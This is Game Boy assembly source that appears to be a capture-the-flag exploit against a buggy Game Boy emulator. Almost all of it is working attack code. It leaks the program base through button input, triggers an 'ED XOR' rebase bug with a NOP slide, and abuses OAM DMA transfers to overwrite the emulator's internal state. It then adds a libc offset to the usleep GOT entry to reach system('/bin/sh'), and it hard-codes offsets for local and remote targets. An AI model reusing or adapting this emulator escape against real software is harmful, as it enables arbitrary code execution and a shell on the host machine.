SECTION "code",ROM0[$0100]
JP start

SECTION "main",ROM0[$0150]
start::

; disable interrupts
di

; disable lcd
ld A, 0
ld [$ff40], A

; $d000 location of leaked program base
ld HL, $d000
label:
call get8bit
ld [HL+], A
ld A, L
cp 16
jr nz, label

nop
jr label2
stop

get8bit::
	ld D, 0
	ld E, 0
g8l::
	call get2bit
	ld C, E
	swap C
	jr z, g8sd
	swap C
g8sl::
	rlc A
	dec C
	jr nz, g8sl

g8sd::
	or D
	ld D, A
	inc E
	inc E
	ld A, E
	cp 8
	jr nz, g8l

	ld A, D
	ret

get2bit::
	call getkey
	cp $8
	jr z, g28
	dec A
	ret

g28::
	ld A, 2
	ret


getkey::
	; select directional pad
	ld A, $20
	ld [$ff00], A

gkloop::
	; read key state until something is pressed
	ld A, [$ff00]
	xor A, $2f
	jr z, gkloop

	ld B, A

gkloop2::
	; wait until key state clears
	ld A, [$ff00]
	xor A, $2f
	jr nz, gkloop2

	ld A, B
	ret


; [HL] = [HL] + [BC]
; crushes A, BC, DE, restores HL
add64::
	ld E, 8
	; ensure carry flag is clear
	xor A

a64l::
	ld D, [HL]
	ld A, [BC]
	inc BC
	adc A, D
	ld [HL+], A
	dec E
	jr nz, a64l

	ld BC, -8
	add HL, BC
	ret

; memcpy(HL, BC, E)
; crushes all regs
memcpy::
	ld A, [BC]
	inc BC
	ld [HL+], A
	dec E
	jr nz, memcpy
	ret

; move program counter up to survive 1st rebase (-0x80)
label2:
jr jump_over

; rebase puts us here, nopslide to jump
REPT $7a
NOP
ENDR

jr label3

NOP
NOP

jump_over:
NOP
NOP

; rebase the program by using the ED XOR bug
LD A, $80
LD C, $90
DB $ED

label3:
REPT 8
NOP
ENDR

; change OAM pointer (now at 0x18) to PIE data section
; data page: 0x0000555555757000
LD HL, $0018
LD BC, $D080 ; data section ptr is here
LD E, 8
; memcpy(HL, BC, E)
memcpy_rel:
	ld A, [BC]
	inc BC
	ld [HL+], A
	dec E
	jr nz, memcpy_rel

; copy the 0x4000 program down to elf64 data section using DMA transfer
LD A, $40
LDH [$FF46], A

; change progbase pointer atomically by using dma transfer
; new progbase = PIE data section - 0xff00
; new prog base is set up for us by python and buttons at 0xD080+8
; set OAM pointer to &progptr - 0x88 to only write the progbase pointer

; 1) copy entire state struct to 0x5000
LD HL, $5000
LD BC, $0000
LD E, $80
; memcpy(HL, BC, E)
memcpy_rel2:
	ld A, [BC]
	inc BC
	ld [HL+], A
	dec E
	jr nz, memcpy_rel2

; 2) modify prog base pointer copy to point to PIE
LD HL, $5010
LD BC, $D088 ; new progbase here
LD E, 8
; memcpy(HL, BC, E)
memcpy_rel3:
	ld A, [BC]
	inc BC
	ld [HL+], A
	dec E
	jr nz, memcpy_rel3

LD HL, $5050
ld A, $10
ld [HL+], A
ld A, $FD
ld [HL+], A

; 3) modify OAM pointer to point to emulator state
LD HL, $0018
LD BC, $0010
LD E, 8
; memcpy(HL, BC, E)
memcpy_rel4:
	ld A, [BC]
	inc BC
	ld [HL+], A
	dec E
	jr nz, memcpy_rel4

; 3) initiate DMA to copy new state onto current state
LD A, $50
LDH [$FF46], A
;;; now program is in .data (0x4000) - no more code here
STOP

; mapped to 0x3f88 (near DMA transfer 0x40)
SECTION "code4000",ROM0[$3F80]
REPT 16
NOP
ENDR

;; code start of relocated program (size must be <0x80)
; 1) read the GOT to get a pointer to libc
; 2) write the GOT usleep with pointer to system("/bin/sh")
; usleep @ 0xFC50

; current PC is 0xFD10
CCF ; my breakpoint (0x2a47)

JR label4

; local
; FFFFFFFFFFF508EC
DB $EC, $08, $F5, $FF, $FF, $FF, $FF, $FF

; remote
; FFFFFFFFFFF5F3F4
;DB $F4, $F3, $F5, $FF, $FF, $FF, $FF, $FF

label4:

LD HL, $FC50
LD BC, $FD13

; [HL] = [HL] + [BC]
; crushes A, BC, DE, restores HL
add64_reloc:
	ld E, 8
	; ensure carry flag is clear
	xor A

a64l_reloc::
	ld D, [HL]
	ld A, [BC]
	inc BC
	adc A, D
	ld [HL+], A
	dec E
	jr nz, a64l_reloc

	ld BC, -8
	add HL, BC

CCF ; my breakpoint (0x2a47)

forever::
	jr forever

